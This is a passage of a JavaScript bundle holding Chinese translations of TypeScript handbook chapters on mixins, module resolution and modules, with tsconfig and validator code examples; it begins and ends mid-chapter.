}\n}\n```\n\n下面创建一个类，结合了这两个mixins。 下面来看一下具体是怎么操作的：\n\n```typescript\nclass SmartObject {\n    ...\n}\n\ninterface SmartObject extends Disposable, Activatable {}\n```\n\n首先注意到的是，我们没有在`SmartObject`类里面继承`Disposable`和`Activatable`，而是在`SmartObject`接口里面继承的。由于[声明合并](declaration-merging.md)的存在，`SmartObject`接口会被混入到`SmartObject`类里面。\n\n它将类视为接口，且只会混入Disposable和Activatable背后的类型到SmartObject类型里，不会混入实现。也就是说，我们要在类里面去实现。 这正是我们想要在混入时避免的行为。\n\n最后，我们将混入融入到了类的实现中去。\n\n```typescript\n// Disposable\nisDisposed: boolean = false;\ndispose: () => void;\n// Activatable\nisActive: boolean = false;\nactivate: () => void;\ndeactivate: () => void;\n```\n\n最后，把mixins混入定义的类，完成全部实现部分。\n\n```typescript\napplyMixins(SmartObject, [Disposable, Activatable]);\n```\n\n最后，创建这个帮助函数，帮我们做混入操作。 它会遍历mixins上的所有属性，并复制到目标上去，把之前的占位属性替换成真正的实现代码。\n\n```typescript\nfunction applyMixins(derivedCtor: any, baseCtors: any[]) {\n    baseCtors.forEach(baseCtor => {\n        Object.getOwnPropertyNames(baseCtor.prototype).forEach(name => {\n            Object.defineProperty(derivedCtor.prototype, name, Object.getOwnPropertyDescriptor(baseCtor.prototype, name));\n        })\n    });\n}\n```\n\n',El='# 模块解析\n\n> 这节假设你已经了解了模块的一些基本知识 请阅读[模块](modules.md)文档了解更多信息。\n\n_模块解析_是指编译器在查找导入模块内容时所遵循的流程。 假设有一个导入语句`import { a } from "moduleA"`; 为了去检查任何对`a`的使用，编译器需要准确的知道它表示什么，并且需要检查它的定义`moduleA`。\n\n这时候，编译器会有个疑问“`moduleA`的结构是怎样的？” 这听上去很简单，但`moduleA`可能在你写的某个`.ts`/`.tsx`文件里或者在你的代码所依赖的`.d.ts`里。\n\n首先，编译器会尝试定位表示导入模块的文件。 编译器会遵循以下二种策略之一：[Classic](module-resolution.md#classic)或[Node](module-resolution.md#node)。 这些策略会告诉编译器到_哪里_去查找`moduleA`。\n\n如果上面的解析失败了并且模块名是非相对的（且是在`"moduleA"`的情况下），编译器会尝试定位一个[外部模块声明](modules.md#ambient-modules)。 我们接下来会讲到非相对导入。\n\n最后，如果编译器还是不能解析这个模块，它会记录一个错误。 在这种情况下，错误可能为`error TS2307: Cannot find module \'moduleA\'.`\n\n## 相对 vs. 非相对模块导入\n\n根据模块引用是相对的还是非相对的，模块导入会以不同的方式解析。\n\n_相对导入_是以`/`，`./`或`../`开头的。 下面是一些例子：\n\n* `import Entry from "./components/Entry";`\n* `import { DefaultHeaders } from "../constants/http";`\n* `import "/mod";`\n\n所有其它形式的导入被当作_非相对_的。 下面是一些例子：\n\n* `import * as $ from "jQuery";`\n* `import { Component } from "@angular/core";`\n\n相对导入在解析时是相对于导入它的文件，并且_不能_解析为一个外部模块声明。 你应该为你自己写的模块使用相对导入，这样能确保它们在运行时的相对位置。\n\n非相对模块的导入可以相对于`baseUrl`或通过下文会讲到的路径映射来进行解析。 它们还可以被解析成[外部模块声明](modules.md#ambient-modules)。 使用非相对路径来导入你的外部依赖。\n\n## 模块解析策略\n\n共有两种可用的模块解析策略：[Node](module-resolution.md#node)和[Classic](module-resolution.md#classic)。 你可以使用`--moduleResolution`标记来指定使用哪种模块解析策略。 若未指定，那么在使用了`--module AMD | System | ES2015`时的默认值为[Classic](module-resolution.md#classic)，其它情况时则为[Node](module-resolution.md#node)。\n\n### Classic\n\n这种策略在以前是TypeScript默认的解析策略。 现在，它存在的理由主要是为了向后兼容。\n\n相对导入的模块是相对于导入它的文件进行解析的。 因此`/root/src/folder/A.ts`文件里的`import { b } from "./moduleB"`会使用下面的查找流程：\n\n1. `/root/src/folder/moduleB.ts`\n2. `/root/src/folder/moduleB.d.ts`\n\n对于非相对模块的导入，编译器则会从包含导入文件的目录开始依次向上级目录遍历，尝试定位匹配的声明文件。\n\n比如：\n\n有一个对`moduleB`的非相对导入`import { b } from "moduleB"`，它是在`/root/src/folder/A.ts`文件里，会以如下的方式来定位`"moduleB"`：\n\n1. `/root/src/folder/moduleB.ts`\n2. `/root/src/folder/moduleB.d.ts`\n3. `/root/src/moduleB.ts`\n4. `/root/src/moduleB.d.ts`\n5. `/root/moduleB.ts`\n6. `/root/moduleB.d.ts`\n7. `/moduleB.ts`\n8. `/moduleB.d.ts`\n\n### Node\n\n这个解析策略试图在运行时模仿[Node.js](https://nodejs.org/)模块解析机制。 完整的Node.js解析算法可以在[Node.js module documentation](https://nodejs.org/api/modules.html#modules_all_together)找到。\n\n#### Node.js如何解析模块\n\n为了理解TypeScript编译依照的解析步骤，先弄明白Node.js模块是非常重要的。 通常，在Node.js里导入是通过`require`函数调用进行的。 Node.js会根据`require`的是相对路径还是非相对路径做出不同的行为。\n\n相对路径很简单。 例如，假设有一个文件路径为`/root/src/moduleA.js`，包含了一个导入`var x = require("./moduleB");` Node.js以下面的顺序解析这个导入：\n\n1. 检查`/root/src/moduleB.js`文件是否存在。\n2. 检查`/root/src/moduleB`目录是否包含一个`package.json`文件，且`package.json`文件指定了一个`"main"`模块。 在我们的例子里，如果Node.js发现文件`/root/src/moduleB/package.json`包含了`{ "main": "lib/mainModule.js" }`，那么Node.js会引用`/root/src/moduleB/lib/mainModule.js`。\n3. 检查`/root/src/moduleB`目录是否包含一个`index.js`文件。 这个文件会被隐式地当作那个文件夹下的"main"模块。\n\n你可以阅读Node.js文档了解更多详细信息：[file modules](https://nodejs.org/api/modules.html#modules_file_modules) 和 [folder modules](https://nodejs.org/api/modules.html#modules_folders_as_modules)。\n\n但是，[非相对模块名](module-resolution.md#relative-vs-non-relative-module-imports)的解析是个完全不同的过程。 Node会在一个特殊的文件夹`node_modules`里查找你的模块。 `node_modules`可能与当前文件在同一级目录下，或者在上层目录里。 Node会向上级目录遍历，查找每个`node_modules`直到它找到要加载的模块。\n\n还是用上面例子，但假设`/root/src/moduleA.js`里使用的是非相对路径导入`var x = require("moduleB");`。 Node则会以下面的顺序去解析`moduleB`，直到有一个匹配上。\n\n1. `/root/src/node_modules/moduleB.js`\n2. `/root/src/node_modules/moduleB/package.json` \\(如果指定了`"main"`属性\\)\n3. `/root/src/node_modules/moduleB/index.js`\n4. `/root/node_modules/moduleB.js`\n5. `/root/node_modules/moduleB/package.json` \\(如果指定了`"main"`属性\\)\n6. `/root/node_modules/moduleB/index.js`\n7. `/node_modules/moduleB.js`\n8. `/node_modules/moduleB/package.json` \\(如果指定了`"main"`属性\\)\n9. `/node_modules/moduleB/index.js`\n\n注意Node.js在步骤（4）和（7）会向上跳一级目录。\n\n你可以阅读Node.js文档了解更多详细信息：[loading modules from `node_modules`](https://nodejs.org/api/modules.html#modules_loading_from_node_modules_folders)。\n\n#### TypeScript如何解析模块\n\nTypeScript是模仿Node.js运行时的解析策略来在编译阶段定位模块定义文件。 因此，TypeScript在Node解析逻辑基础上增加了TypeScript源文件的扩展名（`.ts`，`.tsx`和`.d.ts`）。 同时，TypeScript在`package.json`里使用字段`"types"`来表示类似`"main"`的意义 - 编译器会使用它来找到要使用的"main"定义文件。\n\n比如，有一个导入语句`import { b } from "./moduleB"`在`/root/src/moduleA.ts`里，会以下面的流程来定位`"./moduleB"`：\n\n1. `/root/src/moduleB.ts`\n2. `/root/src/moduleB.tsx`\n3. `/root/src/moduleB.d.ts`\n4. `/root/src/moduleB/package.json` \\(如果指定了`"types"`属性\\)\n5. `/root/src/moduleB/index.ts`\n6. `/root/src/moduleB/index.tsx`\n7. `/root/src/moduleB/index.d.ts`\n\n回想一下Node.js先查找`moduleB.js`文件，然后是合适的`package.json`，再之后是`index.js`。\n\n类似地，非相对的导入会遵循Node.js的解析逻辑，首先查找文件，然后是合适的文件夹。 因此`/root/src/moduleA.ts`文件里的`import { b } from "moduleB"`会以下面的查找顺序解析：\n\n1. `/root/src/node_modules/moduleB.ts`\n2. `/root/src/node_modules/moduleB.tsx`\n3. `/root/src/node_modules/moduleB.d.ts`\n4. `/root/src/node_modules/moduleB/package.json` \\(如果指定了`"types"`属性\\)\n5. `/root/src/node_modules/@types/moduleB.d.ts`\n6. `/root/src/node_modules/moduleB/index.ts`\n7. `/root/src/node_modules/moduleB/index.tsx`\n8. `/root/src/node_modules/moduleB/index.d.ts`\n9. `/root/node_modules/moduleB.ts`\n10. `/root/node_modules/moduleB.tsx`\n11. `/root/node_modules/moduleB.d.ts`\n12. `/root/node_modules/moduleB/package.json` \\(如果指定了`"types"`属性\\)\n13. `/root/node_modules/@types/moduleB.d.ts`\n14. `/root/node_modules/moduleB/index.ts`\n15. `/root/node_modules/moduleB/index.tsx`\n16. `/root/node_modules/moduleB/index.d.ts`\n17. `/node_modules/moduleB.ts`\n18. `/node_modules/moduleB.tsx`\n19. `/node_modules/moduleB.d.ts`\n20. `/node_modules/moduleB/package.json` \\(如果指定了`"types"`属性\\)\n21. `/node_modules/@types/moduleB.d.ts`\n22. `/node_modules/moduleB/index.ts`\n23. `/node_modules/moduleB/index.tsx`\n24. `/node_modules/moduleB/index.d.ts`\n\n不要被这里步骤的数量吓到 - TypeScript只是在步骤（9）和（17）向上跳了两次目录。 这并不比Node.js里的流程复杂。\n\n## 附加的模块解析标记\n\n有时工程源码结构与输出结构不同。 通常是要经过一系统的构建步骤最后生成输出。 它们包括将`.ts`编译成`.js`，将不同位置的依赖拷贝至一个输出位置。 最终结果就是运行时的模块名与包含它们声明的源文件里的模块名不同。 或者最终输出文件里的模块路径与编译时的源文件路径不同了。\n\nTypeScript编译器有一些额外的标记用来_通知_编译器在源码编译成最终输出的过程中都发生了哪个转换。\n\n有一点要特别注意的是编译器_不会_进行这些转换操作； 它只是利用这些信息来指导模块的导入。\n\n### Base URL\n\n在利用AMD模块加载器的应用里使用`baseUrl`是常见做法，它要求在运行时模块都被放到了一个文件夹里。 这些模块的源码可以在不同的目录下，但是构建脚本会将它们集中到一起。\n\n设置`baseUrl`来告诉编译器到哪里去查找模块。 所有非相对模块导入都会被当做相对于`baseUrl`。\n\n_baseUrl_的值由以下两者之一决定：\n\n* 命令行中_baseUrl_的值（如果给定的路径是相对的，那么将相对于当前路径进行计算）\n* ‘tsconfig.json’里的_baseUrl_属性（如果给定的路径是相对的，那么将相对于‘tsconfig.json’路径进行计算）\n\n注意相对模块的导入不会被设置的`baseUrl`所影响，因为它们总是相对于导入它们的文件。\n\n阅读更多关于`baseUrl`的信息[RequireJS](http://requirejs.org/docs/api.html#config-baseUrl)和[SystemJS](https://github.com/systemjs/systemjs/blob/master/docs/config-api.md#baseurl)。\n\n### 路径映射\n\n有时模块不是直接放在_baseUrl_下面。 比如，充分`"jquery"`模块地导入，在运行时可能被解释为`"node_modules/jquery/dist/jquery.slim.min.js"`。 加载器使用映射配置来将模块名映射到运行时的文件，查看[RequireJs documentation](http://requirejs.org/docs/api.html#config-paths)和[SystemJS documentation](https://github.com/systemjs/systemjs/blob/master/docs/config-api.md#paths)。\n\nTypeScript编译器通过使用`tsconfig.json`文件里的`"paths"`来支持这样的声明映射。 下面是一个如何指定`jquery`的`"paths"`的例子。\n\n```javascript\n{\n  "compilerOptions": {\n    "baseUrl": ".", // This must be specified if "paths" is.\n    "paths": {\n      "jquery": ["node_modules/jquery/dist/jquery"] // 此处映射是相对于"baseUrl"\n    }\n  }\n}\n```\n\n请注意`"paths"`是相对于`"baseUrl"`进行解析。 如果`"baseUrl"`被设置成了除`"."`外的其它值，比如`tsconfig.json`所在的目录，那么映射必须要做相应的改变。 如果你在上例中设置了`"baseUrl": "./src"`，那么jquery应该映射到`"../node_modules/jquery/dist/jquery"`。\n\n通过`"paths"`我们还可以指定复杂的映射，包括指定多个回退位置。 假设在一个工程配置里，有一些模块位于一处，而其它的则在另个的位置。 构建过程会将它们集中至一处。 工程结构可能如下：\n\n```text\nprojectRoot\n├── folder1\n│   ├── file1.ts (imports \'folder1/file2\' and \'folder2/file3\')\n│   └── file2.ts\n├── generated\n│   ├── folder1\n│   └── folder2\n│       └── file3.ts\n└── tsconfig.json\n```\n\n相应的`tsconfig.json`文件如下：\n\n```javascript\n{\n  "compilerOptions": {\n    "baseUrl": ".",\n    "paths": {\n      "*": [\n        "*",\n        "generated/*"\n      ]\n    }\n  }\n}\n```\n\n它告诉编译器所有匹配`"*"`（所有的值）模式的模块导入会在以下两个位置查找：\n\n1. `"*"`： 表示名字不发生改变，所以映射为`<moduleName>` =&gt; `<baseUrl>/<moduleName>`\n2. `"generated/*"`表示模块名添加了“generated”前缀，所以映射为`<moduleName>` =&gt; `<baseUrl>/generated/<moduleName>`\n\n按照这个逻辑，编译器将会如下尝试解析这两个导入：\n\n* 导入\'folder1/file2\'\n  1. 匹配\'\\*\'模式且通配符捕获到整个名字。\n  2. 尝试列表里的第一个替换：\'\\*\' -&gt; `folder1/file2`。\n  3. 替换结果为非相对名 - 与_baseUrl_合并 -&gt; `projectRoot/folder1/file2.ts`。\n  4. 文件存在。完成。\n* 导入\'folder2/file3\'\n  1. 匹配\'\\*\'模式且通配符捕获到整个名字。\n  2. 尝试列表里的第一个替换：\'\\*\' -&gt; `folder2/file3`。\n  3. 替换结果为非相对名 - 与_baseUrl_合并 -&gt; `projectRoot/folder2/file3.ts`。\n  4. 文件不存在，跳到第二个替换。\n  5. 第二个替换：\'generated/\\*\' -&gt; `generated/folder2/file3`。\n  6. 替换结果为非相对名 - 与_baseUrl_合并 -&gt; `projectRoot/generated/folder2/file3.ts`。\n  7. 文件存在。完成。\n\n### 利用`rootDirs`指定虚拟目录\n\n有时多个目录下的工程源文件在编译时会进行合并放在某个输出目录下。 这可以看做一些源目录创建了一个“虚拟”目录。\n\n利用`rootDirs`，可以告诉编译器生成这个虚拟目录的_roots_； 因此编译器可以在“虚拟”目录下解析相对模块导入，就_好像_它们被合并在了一起一样。\n\n比如，有下面的工程结构：\n\n```text\n src\n └── views\n     └── view1.ts (imports \'./template1\')\n     └── view2.ts\n\n generated\n └── templates\n         └── views\n             └── template1.ts (imports \'./view2\')\n```\n\n`src/views`里的文件是用于控制UI的用户代码。 `generated/templates`是UI模版，在构建时通过模版生成器自动生成。 构建中的一步会将`/src/views`和`/generated/templates/views`的输出拷贝到同一个目录下。 在运行时，视图可以假设它的模版与它同在一个目录下，因此可以使用相对导入`"./template"`。\n\n可以使用`"rootDirs"`来告诉编译器。 `"rootDirs"`指定了一个_roots_列表，列表里的内容会在运行时被合并。 因此，针对这个例子，`tsconfig.json`如下：\n\n```javascript\n{\n  "compilerOptions": {\n    "rootDirs": [\n      "src/views",\n      "generated/templates/views"\n    ]\n  }\n}\n```\n\n每当编译器在某一`rootDirs`的子目录下发现了相对模块导入，它就会尝试从每一个`rootDirs`中导入。\n\n`rootDirs`的灵活性不仅仅局限于其指定了要在逻辑上合并的物理目录列表。它提供的数组可以包含任意数量的任何名字的目录，不论它们是否存在。这允许编译器以类型安全的方式处理复杂捆绑\\(bundles\\)和运行时的特性，比如条件引入和工程特定的加载器插件。\n\n设想这样一个国际化的场景，构建工具自动插入特定的路径记号来生成针对不同区域的捆绑，比如将`#{locale}`做为相对模块路径`./#{locale}/messages`的一部分。在这个假定的设置下，工具会枚举支持的区域，将抽像的路径映射成`./zh/messages`，`./de/messages`等。\n\n假设每个模块都会导出一个字符串的数组。比如`./zh/messages`可能包含：\n\n```typescript\nexport default [\n    "您好吗",\n    "很高兴认识你"\n];\n```\n\n利用`rootDirs`我们可以让编译器了解这个映射关系，从而也允许编译器能够安全地解析`./#{locale}/messages`，就算这个目录永远都不存在。比如，使用下面的`tsconfig.json`：\n\n```javascript\n{\n  "compilerOptions": {\n    "rootDirs": [\n      "src/zh",\n      "src/de",\n      "src/#{locale}"\n    ]\n  }\n}\n```\n\n编译器现在可以将`import messages from \'./#{locale}/messages\'`解析为`import messages from \'./zh/messages\'`用做工具支持的目的，并允许在开发时不必了解区域信息。\n\n## 跟踪模块解析\n\n如之前讨论，编译器在解析模块时可能访问当前文件夹外的文件。 这会导致很难诊断模块为什么没有被解析，或解析到了错误的位置。 通过`--traceResolution`启用编译器的模块解析跟踪，它会告诉我们在模块解析过程中发生了什么。\n\n假设我们有一个使用了`typescript`模块的简单应用。 `app.ts`里有一个这样的导入`import * as ts from "typescript"`。\n\n```text\n│   tsconfig.json\n├───node_modules\n│   └───typescript\n│       └───lib\n│               typescript.d.ts\n└───src\n        app.ts\n```\n\n使用`--traceResolution`调用编译器。\n\n```text\ntsc --traceResolution\n```\n\n输出结果如下：\n\n```text\n======== Resolving module \'typescript\' from \'src/app.ts\'. ========\nModule resolution kind is not specified, using \'NodeJs\'.\nLoading module \'typescript\' from \'node_modules\' folder.\nFile \'src/node_modules/typescript.ts\' does not exist.\nFile \'src/node_modules/typescript.tsx\' does not exist.\nFile \'src/node_modules/typescript.d.ts\' does not exist.\nFile \'src/node_modules/typescript/package.json\' does not exist.\nFile \'node_modules/typescript.ts\' does not exist.\nFile \'node_modules/typescript.tsx\' does not exist.\nFile \'node_modules/typescript.d.ts\' does not exist.\nFound \'package.json\' at \'node_modules/typescript/package.json\'.\n\'package.json\' has \'types\' field \'./lib/typescript.d.ts\' that references \'node_modules/typescript/lib/typescript.d.ts\'.\nFile \'node_modules/typescript/lib/typescript.d.ts\' exist - use it as a module resolution result.\n======== Module name \'typescript\' was successfully resolved to \'node_modules/typescript/lib/typescript.d.ts\'. ========\n```\n\n#### 需要留意的地方\n\n* 导入的名字及位置\n\n  > ======== Resolving module **\'typescript\'** from **\'src/app.ts\'**. ========\n\n* 编译器使用的策略\n\n  > Module resolution kind is not specified, using **\'NodeJs\'**.\n\n* 从npm加载types\n\n  > \'package.json\' has **\'types\'** field \'./lib/typescript.d.ts\' that references \'node\\_modules/typescript/lib/typescript.d.ts\'.\n\n* 最终结果\n\n  > ======== Module name \'typescript\' was **successfully resolved** to \'node\\_modules/typescript/lib/typescript.d.ts\'. ========\n\n## 使用`--noResolve`\n\n正常来讲编译器会在开始编译之前解析模块导入。 每当它成功地解析了对一个文件`import`，这个文件被会加到一个文件列表里，以供编译器稍后处理。\n\n`--noResolve`编译选项告诉编译器不要添加任何不是在命令行上传入的文件到编译列表。 编译器仍然会尝试解析模块，但是只要没有指定这个文件，那么它就不会被包含在内。\n\n比如\n\n#### app.ts\n\n```typescript\nimport * as A from "moduleA" // OK, moduleA passed on the command-line\nimport * as B from "moduleB" // Error TS2307: Cannot find module \'moduleB\'.\n```\n\n```text\ntsc app.ts moduleA.ts --noResolve\n```\n\n使用`--noResolve`编译`app.ts`：\n\n* 可能正确找到`moduleA`，因为它在命令行上指定了。\n* 找不到`moduleB`，因为没有在命令行上传递。\n\n## 常见问题\n\n### 为什么在`exclude`列表里的模块还会被编译器使用\n\n`tsconfig.json`将文件夹转变一个“工程” 如果不指定任何`“exclude”`或`“files”`，文件夹里的所有文件包括`tsconfig.json`和所有的子目录都会在编译列表里。 如果你想利用`“exclude”`排除某些文件，甚至你想指定所有要编译的文件列表，请使用`“files”`。\n\n有些是被`tsconfig.json`自动加入的。 它不会涉及到上面讨论的模块解析。 如果编译器识别出一个文件是模块导入目标，它就会加到编译列表里，不管它是否被排除了。\n\n因此，要从编译列表中排除一个文件，你需要在排除它的同时，还要排除所有对它进行`import`或使用了`/// <reference path="..." />`指令的文件。\n\n',Tl='# 模块\n\n> **关于术语的一点说明:** 请务必注意一点，TypeScript 1.5里术语名已经发生了变化。 “内部模块”现在称做“命名空间”。 “外部模块”现在则简称为“模块”，这是为了与[ECMAScript 2015](http://www.ecma-international.org/ecma-262/6.0/)里的术语保持一致，\\(也就是说 `module X {` 相当于现在推荐的写法 `namespace X {`\\)。\n\n## 介绍\n\n从ECMAScript 2015开始，JavaScript引入了模块的概念。TypeScript也沿用这个概念。\n\n模块在其自身的作用域里执行，而不是在全局作用域里；这意味着定义在一个模块里的变量，函数，类等等在模块外部是不可见的，除非你明确地使用[`export`形式](modules.md#export)之一导出它们。 相反，如果想使用其它模块导出的变量，函数，类，接口等的时候，你必须要导入它们，可以使用[`import`形式](modules.md#import)之一。\n\n模块是自声明的；两个模块之间的关系是通过在文件级别上使用imports和exports建立的。\n\n模块使用模块加载器去导入其它的模块。 在运行时，模块加载器的作用是在执行此模块代码前去查找并执行这个模块的所有依赖。 众所周知的JavaScript模块加载器有：作用于[CommonJS](https://en.wikipedia.org/wiki/CommonJS)模块的Node.js加载器和在Web应用里作用于[AMD](https://github.com/amdjs/amdjs-api/blob/master/AMD.md)模块的[RequireJS](http://requirejs.org/)加载器。\n\nTypeScript与ECMAScript 2015一样，任何包含顶级`import`或者`export`的文件都被当成一个模块。 相反地，如果一个文件不带有顶级的`import`或者`export`声明，那么它的内容被视为全局可见的（因此对模块也是可见的）。\n\n## 导出\n\n### 导出声明\n\n任何声明（比如变量，函数，类，类型别名或接口）都能够通过添加`export`关键字来导出。\n\n**StringValidator.ts**\n\n```typescript\nexport interface StringValidator {\n    isAcceptable(s: string): boolean;\n}\n```\n\n**ZipCodeValidator.ts**\n\n```typescript\nimport { StringValidator } from "./StringValidator";\n\nexport const numberRegexp = /^[0-9]+$/;\n\nexport class ZipCodeValidator implements StringValidator {\n    isAcceptable(s: string) {\n        return s.length === 5 && numberRegexp.test(s);\n    }\n}\n```\n\n### 导出语句\n\n导出语句很便利，因为我们可能需要对导出的部分重命名，所以上面的例子可以这样改写：\n\n```typescript\nclass ZipCodeValidator implements StringValidator {\n    isAcceptable(s: string) {\n        return s.length === 5 && numberRegexp.test(s);\n    }\n}\nexport { ZipCodeValidator };\nexport { ZipCodeValidator as mainValidator };\n```\n\n### 重新导出\n\n我们经常会去扩展其它模块，并且只导出那个模块的部分内容。 重新导出功能并不会在当前模块导入那个模块或定义一个新的局部变量。\n\n**ParseIntBasedZipCodeValidator.ts**\n\n```typescript\nexport class ParseIntBasedZipCodeValidator {\n    isAcceptable(s: string) {\n        return s.length === 5 && parseInt(s).toString() === s;\n    }\n}\n\n// 导出原先的验证器但做了重命名\nexport {ZipCodeValidator as RegExpBasedZipCodeValidator} from "./ZipCodeValidator";\n```\n\n或者一个模块可以包裹多个模块，并把他们导出的内容联合在一起通过语法：`export * from "module"`。\n\n**AllValidators.ts**\n\n```typescript\nexport * from "./StringValidator"; // exports \'StringValidator\' interface\nexport * from "./ZipCodeValidator";  // exports \'ZipCodeValidator\' and const \'numberRegexp\' class\nexport * from "./ParseIntBasedZipCodeValidator"; //  exports the \'ParseIntBasedZipCodeValidator\' class\n                                                 // and re-exports \'RegExpBasedZipCodeValidator\' as alias\n                                                 // of the \'ZipCodeValidator\' class from \'ZipCodeValidator.ts\'\n```\n\n## 导入\n\n模块的导入操作与导出一样简单。 可以使用以下`import`形式之一来导入其它模块中的导出内容。\n\n### 导入一个模块中的某个导出内容\n\n```typescript\nimport { ZipCodeValidator } from "./ZipCodeValidator";\n\nlet myValidator = new ZipCodeValidator();\n```\n\n可以对导入内容重命名\n\n```typescript\nimport { ZipCodeValidator as ZCV } from "./ZipCodeValidator";\nlet myValidator = new ZCV();\n```\n\n### 将整个模块导入到一个变量，并通过它来访问模块的导出部分\n\n```typescript\nimport * as validator from "./ZipCodeValidator";\nlet myValidator = new validator.ZipCodeValidator();\n```\n\n### 具有副作用的导入模块\n\n尽管不推荐这么做，一些模块会设置一些全局状态供其它模块使用。 这些模块可能没有任何的导出或用户根本就不关注它的导出。 使用下面的方法来导入这类模块：\n\n```typescript\nimport "./my-module.js";\n```\n\n## 默认导出\n\n每个模块都可以有一个`default`导出。 默认导出使用`default`关键字标记；并且一个模块只能够有一个`default`导出。 需要使用一种特殊的导入形式来导入`default`导出。\n\n`default`导出十分便利。 比如，像jQuery这样的类库可能有一个默认导出`jQuery`或`$`，并且我们基本上也会使用同样的名字`jQuery`或`$`导出jQuery。\n\n**jQuery.d.ts**\n\n```typescript\ndeclare let $: jQuery;\nexport default $;\n```\n\n**App.ts**\n\n```typescript\nimport $ from "jQuery";\n\n$("button.continue").html( "Next Step..." );\n```\n\n类和函数声明可以直接被标记为默认导出。 标记为默认导出的类和函数的名字是可以省略的。\n\n**ZipCodeValidator.ts**\n\n```typescript\nexport default class ZipCodeValidator {\n    static numberRegexp = /^[0-9]+$/;\n    isAcceptable(s: string) {\n        return s.length === 5 && ZipCodeValidator.numberRegexp.test(s);\n    }\n}\n```\n\n**Test.ts**\n\n```typescript\nimport validator from "./ZipCodeValidator";\n\nlet myValidator = new validator();\n```\n\n或者\n\n**StaticZipCodeValidator.ts**\n\n```typescript\nconst numberRegexp = /^[0-9]+$/;\n\nexport default function (s: string) {\n    return s.length === 5 && numberRegexp.test(s);\n}\n```\n\n**Test.ts**\n\n```typescript\nimport validate from "./StaticZipCodeValidator";\n\nlet strings = ["Hello", "98052", "101"];\n\n// Use function validate\nstrings.forEach(s => {\n  console.log(`"${s}" ${validate(s) ? "matches" : "does not match"}`);\n});\n```\n\n`default`导出也可以是一个值\n\n**OneTwoThree.ts**\n\n```typescript\nexport default "123";\n```\n\n**Log.ts**\n\n```typescript\nimport num from "./OneTwoThree";\n\nconsole.log(num); // "123"\n```\n\n## `export =` 和 `import = require()`\n\nCommonJS和AMD的环境里都有一个`exports`变量，这个变量包含了一个模块的所有导出内容。\n\nCommonJS和AMD的`exports`都可以被赋值为一个`对象`, 这种情况下其作用就类似于 es6 语法里的默认导出，即 `export default`语法了。虽然作用相似，但是 `export default` 语法并不能兼容CommonJS和AMD的`exports`。\n\n为了支持CommonJS和AMD的`exports`, TypeScript提供了`export =`语法。\n\n`export =`语法定义一个模块的导出`对象`。 这里的`对象`一词指的是类，接口，命名空间，函数或枚举。\n\n若使用`export =`导出一个模块，则必须使用TypeScript的特定语法`import module = require("module")`来导入此模块。\n\n**ZipCodeValidator.ts**\n\n```typescript\nlet numberRegexp = /^[0-9]+$/;\nclass ZipCodeValidator {\n    isAcceptable(s: string) {\n        return s.length === 5 && numberRegexp.test(s);\n    }\n}\nexport = ZipCodeValidator;\n```\n\n**Test.ts**\n\n```typescript\nimport zip = require("./ZipCodeValidator");\n\n// Some samples to try\nlet strings = ["Hello", "98052", "101"];\n\n// Validators to use\nlet validator = new zip();\n\n// Show whether each string passed each validator\nstrings.forEach(s => {\n  console.log(`"${ s }" - ${ validator.isAcceptable(s) ? "matches" : "does not match" }`);\n});\n```\n\n## 生成模块代码\n\n根据编译时指定的模块目标参数，编译器会生成相应的供Node.js \\([CommonJS](http://wiki.commonjs.org/wiki/CommonJS)\\)，Require.js \\([AMD](https://github.com/amdjs/amdjs-api/wiki/AMD)\\)，[UMD](https://github.com/umdjs/umd), [SystemJS](https://github.com/systemjs/systemjs)或[ECMAScript 2015 native modules](http://www.ecma-international.org/ecma-262/6.0/#sec-modules) \\(ES6\\)模块加载系统使用的代码。 想要了解生成代码中`define`，`require` 和 `register`的意义，请参考相应模块加载器的文档。\n\n下面的例子说明了导入导出语句里使用的名字是怎么转换为相应的模块加载器代码的。\n\n**SimpleModule.ts**\n\n```typescript\nimport m = require("mod");\nexport let t = m.something + 1;\n```\n\n**AMD / RequireJS SimpleModule.js**\n\n```javascript\ndefine(["require", "exports", "./mod"], function (require, exports, mod_1) {\n    exports.t = mod_1.something + 1;\n});\n```\n\n**CommonJS / Node SimpleModule.js**\n\n```javascript\nlet mod_1 = require("./mod");\nexports.t = mod_1.something + 1;\n```\n\n**UMD SimpleModule.js**\n\n```javascript\n(function (factory) {\n    if (typeof module === "object" && typeof module.exports === "object") {\n        let v = factory(require, exports); if (v !== undefined) module.exports = v;\n    }\n    else if (typeof define === "function" && define.amd) {\n        define(["require", "exports", "./mod"], factory);\n    }\n})(function (require, exports) {\n    let mod_1 = require("./mod");\n    exports.t = mod_1.something + 1;\n});\n```\n\n**System SimpleModule.js**\n\n```javascript\nSystem.register(["./mod"], function(exports_1) {\n    let mod_1;\n    let t;\n    return {\n        setters:[\n            function (mod_1_1) {\n                mod_1 = mod_1_1;\n            }],\n        execute: function() {\n            exports_1("t", t = mod_1.something + 1);\n        }\n    }\n});\n```\n\n**Native ECMAScript 2015 modules SimpleModule.js**\n\n```javascript\nimport { something } from "./mod";\nexport let t = something + 1;\n```\n\n## 简单示例\n\n下面我们来整理一下前面的验证器实现，每个模块只有一个命名的导出。\n\n为了编译，我们必需要在命令行上指定一个模块目标。对于Node.js来说，使用`--module commonjs`； 对于Require.js来说，使用`--module amd`。比如：\n\n```text\ntsc --module commonjs Test.ts\n```\n\n编译完成后，每个模块会生成一个单独的`.js`文件。 好比使用了reference标签，编译器会根据`import`语句编译相应的文件。\n\n**Validation.ts**\n\n```typescript\nexport interface StringValidator {\n    isAcceptable(s: string): boolean;\n}\n```\n\n**LettersOnlyValidator.ts**\n\n```typescript\nimport { StringValidator } from "./Validation";\n\nconst lettersRegexp = /^[A-Za-z]+$/;\n\nexport class LettersOnlyValidator implements StringValidator {\n    isAcceptable(s: string) {\n        return lettersRegexp.test(s);\n    }\n}\n```\n\n**ZipCodeValidator.ts**\n\n```typescript\nimport { StringValidator } from "./Validation";\n\nconst numberRegexp = /^[0-9]+$/;\n\nexport class ZipCodeValidator implements StringValidator {\n    isAcceptable(s: string) {\n        return s.length === 5 && numberRegexp.test(s);\n    }\n}\n```\n\n**Test.ts**\n\n```typescript\nimport { StringValidator } from "./Validation";\nimport { ZipCodeValidator } from "./ZipCodeValidator";\nimport { LettersOnlyValidator } from "./LettersOnlyValidator";\n\n// Some samples to try\nlet strings = ["Hello", "98052", "101"];\n\n// Validators to use\nlet validators: { [s: string]: StringValidator; } = {};\nvalidators["ZIP code"] = new ZipCodeValidator();\nvalidators["Letters only"] = new LettersOnlyValidator();\n\n// Show whether each string passed each validator\nstrings.forEach(s => {\n    for (let name in validators) {\n        console.log(`"${ s }" - ${ validators[name].isAcceptable(s) 